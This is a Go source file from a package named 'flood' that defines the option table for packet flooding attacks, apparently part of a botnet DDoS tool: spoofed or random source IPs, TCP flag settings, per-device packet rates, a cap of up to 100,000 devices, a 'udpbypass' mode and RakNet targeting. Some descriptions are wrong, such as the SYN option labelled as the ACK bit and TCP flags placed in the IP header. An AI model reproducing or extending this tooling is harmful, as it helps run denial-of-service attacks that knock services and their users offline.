package flood

import "reflect"

var Options = map[string]Option{
	"len": {
		ID:          0,
		Description: "Length of the packet data, default is 512 bytes",
		Minimum:     0,
		Maximum:     1409,
		Type:        reflect.Int,
	},
	"rand": {
		ID:          1,
		Description: "Randomize the packet data everytime, default is 1 (yes)",
		Type:        reflect.Bool,
	},
	"tos": {
		ID:          2,
		Description: "TOS field value in the IP header, default is 0",
		Type:        reflect.Int,
	},
	"ident": {
		ID:          3,
		Description: "ID field value in the IP header, default is randomized",
		Type:        reflect.Int,
	},
	"ttl": {
		ID:          4,
		Description: "TTL field in the IP header, default is 64",
		Type:        reflect.Int,
	},
	"df": {
		ID:          5,
		Description: "Set the dont-fragment bit in the IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"sport": {
		ID:          6,
		Description: "Source port, default is randomized",
		Type:        reflect.Int,
	},
	"dport": {
		ID:          7,
		Description: "Destination port, default is randomized",
		Type:        reflect.Int,
	},
	"urg": {
		ID:          11,
		Description: "Set the URG bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"ack": {
		ID:          12,
		Description: "Set the ACK bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"psh": {
		ID:          13,
		Description: "Set the PSH bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"rst": {
		ID:          14,
		Description: "Set the RST bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"syn": {
		ID:          15,
		Description: "Set the ACK bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"fin": {
		ID:          16,
		Description: "Set the FIN bit in IP header, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"seq": {
		ID:          17,
		Description: "Sequence number value in TCP header, default is random",
		Type:        reflect.Int,
	},
	"ackseq": {
		ID:          18,
		Description: "Ack number value in TCP header, default is random",
		Type:        reflect.Int,
	},
	"gcip": {
		ID:          19,
		Description: "Set internal IP to destination ip, default is 0 (no)",
		Type:        reflect.Bool,
	},
	"sourceip": {
		ID:          25,
		Description: "Source IP address, 255.255.255.255 for random",
		Type:        reflect.String,
	},
	"minlen": {
		ID:          27,
		Description: "Minimum length of the packet data, default is 0 (disabled)",
		Type:        reflect.Int,
		Maximum:     1409,
		Minimum:     0,
		Default:     700,
		HasDefault:  true,
	},
	"maxlen": {
		ID:          28,
		Description: "Maximum length of the packet data, default is 0 (disabled)",
		Type:        reflect.Int,
		Maximum:     1409,
		Minimum:     0,
		Default:     900,
		HasDefault:  true,
	},
	"payload": {
		ID:          29,
		Description: "Payload in hexadecimal, default is randomized",
		Type:        reflect.String,
	},
	"repeat": {
		ID:          30,
		Description: "Connect multiple times before flooding, default is 1",
		Type:        reflect.Int,
	},
	"csleep": {
		ID:          31,
		Description: "Delay between the reconnections in milliseconds, default is 0",
		Type:        reflect.Int,
	},
	"minpps": {
		ID:          32,
		Description: "Minimum pp/s per device, default is 0 (disabled)",
		Type:        reflect.Int,
	},
	"maxpps": {
		ID:          33,
		Description: "Maximum pp/s per device, default is 0 (disabled)",
		Type:        reflect.Int,
	},
	"sleep": {
		ID:          34,
		Description: "Delay flooding in microseconds, default is 0",
		Type:        reflect.Int,
	},
	"tcpport": {
		ID:          35,
		Description: "TCP port, used in udpbypass.",
		Type:        reflect.Int,
	},
	"protocol": {
		ID:          36,
		Description: "RakNet Protocol ID",
		Type:        reflect.Int,
	},
	"maxdevices": {
    ID:          37,
    Description: "Maximum number of devices to flood, default is 0 (unlimited)",
    Type:        reflect.Int,
    Minimum:     0,
    Maximum:     100000,
    Default:     0,
    HasDefault:  true,
},
}

func InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}
